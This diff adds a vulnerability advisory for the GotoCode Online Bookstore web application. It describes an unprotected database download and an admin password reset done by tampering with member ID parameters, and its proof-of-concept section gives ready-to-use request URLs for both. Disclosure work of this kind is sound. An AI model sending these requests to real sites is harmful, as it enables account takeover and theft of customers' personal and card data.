@@ -1,0 +1,36 @@
+###############################################################################
+# Exploit Title : GotoCode Online Bookstore Multiple Vulnerabilities
+# Vulnerability : Privilege Escalation / Remote Database Download
+# Date      : 03/10/2011
+# Author    : Nathaniel Carew
+# Email	    : njcarew@gmail.com
+# Impact    : High
+# Software Link : http://www.gotocode.com/apps.asp?app_id=3&
+# Platform  : ASP.NET
+# Tested on : MS Windows Server Standard 2003 SP2 / IIS 6
+# Thanks    : Peregrinus & Birch Meister General
+###############################################################################
+ 
+Overview:
+---------
+Database:
+If the application is configured using the default directory structure and an
+access database then a user can download the access database.
+
+Privilege Escalation:
+By modifying the Form_member_id and p_Form_member_id variables to the ID of the admin
+account (default ID is 7) on the MyInfo.aspx page in the POST data you can reset the admin
+password with the password you entered into the appropriate feed to gain full admin rights to the web application.
+
+ 
+Proof of Concept:
+-----------------
+http://localhost/[path]/BookStore_MSAccess.mdb
+http://localhost/[path]/MyInfo.aspx?p_Form_member_id=7&Form_member_id=7&Form_member_password=moo&Form_name=Administrator&Form_last_name=Account&Form_email=admin%40localhost&Form_address=&Form_phone=&Form_notes=&Form_card_type_id=1&Form_card_number=111111111111
+ 
+Impact:
+-------
+By resetting the admin password an attacker would be able to completely control the application, users
+and their associated data such as stored credit card information. Successful database exploitation
+would allow an attacker to download the complete database of users information including email addresses
+usernames, passwords, credit cards and associated billing and ordering data.
